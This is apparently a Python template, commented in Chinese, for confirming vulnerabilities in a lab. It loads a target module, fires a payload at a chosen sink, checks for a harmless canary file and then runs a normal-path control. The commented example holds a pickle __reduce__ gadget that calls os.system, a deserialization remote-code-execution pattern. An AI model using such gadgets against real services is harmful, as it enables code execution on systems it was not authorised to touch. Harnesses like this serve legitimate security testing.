#!/usr/bin/env python3
"""实验主体：真实 sink 驱动 + canary + 正控。目标 sink: {sink}（{src_file}）"""
import os
import sys

import stub_loader  # noqa: F401  先桩化重依赖（按 stub_loader.PREFIXES 配置）

# ==== 加载真实代码（只读挂载的仓库）====
# importlib 按文件加载被测模块，绕开包 __init__ 的重依赖链：
import importlib.util
spec = importlib.util.spec_from_file_location("target", "/work/{src_file}")
target = importlib.util.module_from_spec(spec)
sys.modules["target"] = target
spec.loader.exec_module(target)
print("[ENV ] 真实模块加载成功: /work/{src_file}")

CANARY = "/tmp/lab-canary"
CMD = "echo PWNED > " + CANARY   # canary 载荷：只写标记文件

# ==== 1) 攻击载荷（EXP）====
# TODO: 按 sink 语义构造载荷（反序列化 gadget / 路径穿越 / 注入串），
# 调用真实 sink 入口。示例（pickle REDUCE）：
#
# import pickle
# class RCE:
#     def __reduce__(self): return (os.system, (CMD,))
# attack_input = pickle.dumps(RCE())
# target.VULN_ENTRY(attack_input)
#
if os.path.exists(CANARY):
    os.remove(CANARY)
# target.VULN_ENTRY(attack_input)          # ← 打开此行
fired = os.path.exists(CANARY)
print(f"[EXP ] 载荷执行: {{fired}}")
if fired:
    print("[RCE ] 任意命令执行实锤 · canary:", open(CANARY).read().strip())

# ==== 2) 正控（证明通道语义真实、拦截缺失非假象）====
# TODO: 正常数据路径往返断言。示例：
# back = target.decode(target.encode({{"k": [1, "v"]}}))
# assert back == {{"k": [1, "v"]}}, "正控数据损坏"
# print("[CTRL] 正常往返通过 · 通道语义真实")

print("[DONE] 实验结束（记录：真代码/桩化边界/canary/正控/分级）")
